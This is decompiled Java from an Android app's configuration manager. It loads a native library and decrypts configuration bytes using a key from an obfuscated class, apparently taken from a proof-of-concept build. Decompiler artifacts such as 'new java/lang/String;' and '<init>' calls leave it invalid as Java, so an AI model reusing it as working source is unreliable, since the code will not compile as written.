package com.vvt.configurationmanager;

import com.vvt.l.e;
import k.v.T;

public class a
{
  static
  {
    System.loadLibrary("flsonyconfig");
  }
  
  public static String a(byte[] paramArrayOfByte)
  {
    byte[] arrayOfByte = com.vvt.l.a.b(e.a(a()), paramArrayOfByte);
    String str = new java/lang/String;
    str.<init>(arrayOfByte);
    return str;
  }
  
  private static byte[] a()
  {
    T localT = new k/v/T;
    localT.<init>();
    return localT.h();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/configurationmanager/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */